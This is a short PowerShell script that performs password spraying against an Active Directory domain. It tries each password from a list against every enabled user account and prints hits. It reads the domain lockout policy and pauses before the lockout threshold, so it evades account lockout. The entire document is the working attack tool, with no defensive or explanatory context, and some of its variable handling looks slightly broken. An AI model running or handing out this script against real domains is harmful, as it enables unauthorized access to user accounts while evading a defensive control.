$Domain = Get-ADDomain

$PasswordList = Get-Content C:\temp\pwlist.txt
$UserList = Get-ADUser -Properties samAccountName, BadPWDCount -Filter {Enabled -eq $true}

$PwPolicy = Get-ADDefaultDomainPasswordPolicy
$LockWindow = $PwPolicy.LockoutObservationWindow.TotalSeconds
$LockThreshold = $PwPolicy.LockoutThreshold
$LoopCount = 0

Foreach($PassToTest in $PasswordList){
    $SecurePassword = ConvertTo-SecureString -String $PassToTest -AsPlainText -Force

    Foreach($user in $UserList) {
    $UserDomain = $Domain.Name+'\'+$user
    $Credentials = New-Object System.Management.Automation.PSCredential $UserDomain, $SecurePassword
        try {
        $testCred = get-ADUser -Filter * -Credential $Credentials
        $userPWcheck = get-ADUser -Identity "Administrator" -Property BadPWDCount
        $userPWCount = $userPWCheck.BadPWDCount
        Write-Host "Treffer: " $PassToTest "->" $User.SamAccountName "->" $User.BadPWDCount
        }
        catch {
        Write-Host "Passwort falsch: " $PassToTest "->" $User.SamAccountName "->" $User.BadPWDCount
        }
    }

     $LoopCount = $LoopCount + 1
     If ($LoopCount -ge ($LockThreshold - 1)) {
        $LoopCount = 0
        Write-Host "Waiting " (($LockWindow + 30)/60) " Minutes"
        $Date = Get-Date
        Write-Host "Next try " $Date.AddSeconds($LockWindow + 30)
        Start-Sleep -Seconds ($LockWindow + 30)
     }
}
